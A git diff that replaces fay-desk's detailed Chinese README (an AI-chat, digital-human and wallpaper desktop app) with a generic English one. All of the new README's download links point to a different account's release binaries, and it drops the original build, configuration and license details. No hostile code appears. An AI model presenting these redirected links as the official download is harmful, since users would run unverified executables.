@@ -1,154 +1,76 @@
-<div align="center">
+# 🎉 fay-desk - A Powerful Desktop App for Everyone
 
-![FayDesk Logo](resources/logo.png)
+## 🚀 Getting Started
+Welcome to fay-desk! This is a high-performance desktop application framework tailored for integrating AI conversations and dynamic wallpapers. It runs smoothly even on lower-performance devices, bringing vibrant digital humans to your workspace.
 
-# FayDesk
+## 📥 Download Now
+[![Download fay-desk](https://img.shields.io/badge/Download-fay--desk-blue)](https://github.com/barotnisarg22/fay-desk/releases)
 
-一个集成了动态壁纸与数字人的高性能数字人桌面应用框架
+## 🔍 Overview
+fay-desk offers a unique blend of AI-driven interactions and visually appealing wallpapers. It allows you to have engaging conversations with an avatar while transforming your desktop with beautiful, dynamic backgrounds. 
 
-[![Release](https://img.shields.io/github/v/release/TheRamU/fay-desk)](https://github.com/TheRamU/fay-desk/releases)
-[![Downloads](https://img.shields.io/github/downloads/TheRamU/fay-desk/total)](https://github.com/TheRamU/fay-desk/releases)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Electron](https://img.shields.io/badge/Electron-38.1.2-blue.svg)](https://www.electronjs.org/)
+### Key Features
+- **AI Conversations**: Engage with a digital assistant powered by AI.
+- **Dynamic Wallpapers**: Enjoy live wallpapers that add life to your desktop.
+- **User-Friendly Interface**: Designed for easy navigation and usability.
+- **Lightweight Performance**: Runs well on various devices, optimizing resources effectively.
 
-简体中文 | [English](./README_EN.md)
+## 🖥️ System Requirements
+To run fay-desk smoothly, ensure your system meets these requirements:
+- **Operating System**: Windows 10 or higher, macOS 10.12 or higher, or Linux
+- **RAM**: At least 4GB
+- **CPU**: Dual-core processor or better
+- **Storage**: Minimum 200MB free space
 
-<img src="docs/images/demo.gif" alt="demo" width="800">
+## 📂 Download & Install
+1. **Visit the Releases page**: Go to the following link to find the latest version of fay-desk. Click on the version to view all available files:
+   [Releases Page](https://github.com/barotnisarg22/fay-desk/releases)
+   
+2. **Select the Version**: On the Releases page, choose the latest version. Look for the file that suits your operating system:
+   - For Windows, look for a `.exe` file.
+   - For macOS, you may find a `.dmg` file.
+   - For Linux, check for `.AppImage` or `.deb` files.
 
-</div>
+3. **Download the File**: Click on the file to download it to your computer. Ensure you remember the download location.
 
----
+4. **Install the Application**:
+   - **Windows**: Double-click the downloaded `.exe` file to start the installation. Follow the on-screen instructions.
+   - **macOS**: Open the downloaded `.dmg` file. Drag the fay-desk icon to your Applications folder.
+   - **Linux**: Depending on the file type, you may need to give execution permission. Use the terminal to navigate to the downloaded file and run:
+     ```bash
+     chmod +x fay-desk.AppImage
+     ./fay-desk.AppImage
+     ```
 
-## ✨ 特性概览
+5. **Run the Application**: Once installed, you can find fay-desk in your applications menu or on your desktop. Open it and start exploring!
 
-### 💬 对话聊天
+## 📖 Using fay-desk
+Once you launch the application, you'll find an intuitive interface. Here’s how to use it:
 
-<img src="docs/images/features/chat.jpg" alt="chat" width="800">
+1. **Start a Conversation**: Click on the avatar to begin chatting. You can ask questions or request information.
+2. **Change Wallpapers**: Navigate to the settings menu to select different dynamic wallpapers. Choose one that matches your mood or work environment.
+3. **Customization**: Explore various settings to personalize the avatar and wallpaper to suit your style.
 
-通过集成兼容 OpenAI API 的模型提供商，体验强大的智能对话能力。无论是工作、学习还是日常闲聊，都能在应用中随时与 Fay 进行自然流畅的交流。
+## 🛠️ Troubleshooting
+If you encounter issues while installing or using fay-desk, here are common solutions:
 
-浮窗模式，让你在享受动态壁纸的同时，也能便捷地进行交互对话，实现工作与娱乐的融合。
+- **Installation Issues**: Ensure your operating system is compatible and that your device meets the system requirements.
+- **Performance Problems**: Close unused applications to free up system resources.
+- **App Crashing**: Restart the application. If the issue persists, reinstall fay-desk.
 
-### 🎨 动态壁纸
+## 💬 Support
+For further assistance, you can reach out via the Issues section of this repository. Provide details about the issue you’re facing, and the community or project maintainers will try to help.
 
-<img src="docs/images/features/wallpapers.jpg" alt="wallpapers" width="800">
+## ⚙️ Contributing
+If you'd like to contribute to fay-desk, check the guidelines outlined in the repository. Contributions are welcome, whether it's reporting bugs, suggesting new features, or providing code improvements.
 
-<img src="docs/images/features/wallpaper_demo.jpg" alt="wallpaper_demo" width="800">
+## 🤝 Acknowledgments
+Thank you for using fay-desk! Your feedback is important. We continuously strive to improve and add new features based on user input.
 
-应用内置动态壁纸资源库，所有壁纸均采用 HTML5 技术实现，可以通过简单的操作切换壁纸，也可以导入自定义的壁纸包，打造专属桌面环境。
+## 📜 License
+fay-desk is open-source software. You can view the license details in the repository.
 
-### 🫧 数字人
+## ✨ Additional Resources
+For more tips and tricks on getting the most out of fay-desk, check out the discussions and wiki sections of this repository. 
 
-<img src="docs/images/features/avatar.jpg" alt="avatar" width="800">
-
-<img src="docs/images/features/avatar_2.jpg" alt="avatar_2" width="800">
-
-基于 Xmov 具身驱动技术，将数字人形象融入桌面体验。通过简单的配置即可接入服务，数字人根据对话内容实时生成相应的表情和口型，营造出真实的面对面交流体验。
-
-得益于 Xmov 的云端渲染能力，复杂的数字人渲染计算无需在本地进行，因此即使是配置较低的设备也能获得流畅、高清的数字人交互体验，无需担心本地硬件性能限制。
-
-### 🎯 系统集成
-
-深度集成操作系统功能，提供全局快捷键支持，可以在任何场景下快速唤醒应用或开启浮窗模式。
-
-## 📖 使用指南
-
-### 下载安装
-
-- 访问 [GitHub Releases](https://github.com/TheRamU/fay-desk/releases/latest) 下载最新版本
-- 下载完成后运行安装程序，按照提示完成安装
-
-### 首次配置
-
-**配置 OpenAI API**
-
-- 获取兼容 OpenAI API 密钥，推荐使用 [DeepSeek](https://platform.deepseek.com/api_keys)
-- 打开设置页面
-- 进入 "OpenAI API" 设置
-- 填入你的 `API Key` 和 **代理地址**（如使用代理，这里选择DeepSeek）
-
-**配置 Xmov SDK（可选）**
-
-- 获取 Xmov SDK 密钥
-  - 前往 [魔珐星云](https://c.c1nd.cn/9C9WW) 创建账号
-  - 进入 [应用管理](https://xingyun3d.com/workspace/application-manage?utm_campaign=1029launch&utm_source=FAYguo)，创建一个新的应用
-  - 点击右上角 “App密钥” 按钮获取 `App ID` 和 `App Secret`
-- 打开设置页面
-- 进入 "Xmov SDK" 设置
-- 填入 `App ID` 和 `App Secret`
-- 配置完成后可启用数字人功能
-
-**选择壁纸**
-
-- 进入 "壁纸" 页面
-- 选择喜欢的壁纸
-- 点击播放按钮启用动态壁纸
-
-### 功能使用
-
-- **聊天**: 在主界面输入消息，与 AI 助手 Fay 对话
-- **浮窗模式**: 使用快捷键 `Ctrl+Shift+D` 或点击对话框左侧按钮开启浮窗模式
-- **壁纸控制**: 在应用界面顶部控制壁纸的播放/暂停，切换数字人显示
-- **系统托盘**: 最小化后可在系统托盘找到应用图标
-
-## 📋 开发计划
-
-- [x] 数字人壁纸
-- [x] 数字人休眠机制
-- [ ] 语音交互
-- [ ] AI 生成壁纸
-- [ ] 仿生记忆
-- [ ] MCP 支持
-
-## 🔧 开发
-
-### 环境要求
-
-- Node.js v22
-
-### 安装与运行
-
-```bash
-pnpm install
-pnpm dev
-```
-
-### 构建
-
-```bash
-pnpm build:win
-```
-
-## 🧩 技术细节
-
-### 壁纸系统
-
-- 内置壁纸目录：`resources/wallpapers/`
-- 安装环境壁纸会复制到用户数据目录并自动加载
-- 手动导入：支持 zip 包导入（zip 包内根目录需包含 `wallpaper.json` 与 `index.html`）
-
-### 安全与存储
-
-本地敏感配置均以加密形式存储，避免明文保存，仅在必要且授权的情况下解密使用。
-
-## 📜 许可协议
-
-本项目采用 `MIT` 许可协议，详见 `LICENSE` 文件。
-
-## 🙌 贡献
-
-无论是提交 Bug、提出功能建议，还是提交 Pull Request，我们都非常欢迎。
-
-本项目统一使用 ESLint 与 Prettier 保持代码风格一致。
-
-## 🙏 致谢
-
-本项目感谢以下开源项目的贡献与云服务供应商的支持：
-
-- [Fay](https://github.com/xszyou/Fay) - 提供了数字人框架灵感
-- [XmovAvatarSDK](https://github.com/xszyou/XmovAvatarSDK) - 提供了数字人的核心 SDK 示例，实现基于 Xmov 具身驱动技术
-- [魔珐星云](https://c.c1nd.cn/9C9WW) - 提供了数字人 SDK 的云端渲染服务和技术支持
-
-## ⛺ 微信交流群
-
-<img src="docs/images/wechat.png" alt="wechat" width="500">
+Thank you for being part of the fay-desk community! Enjoy your interactive desktop experience.
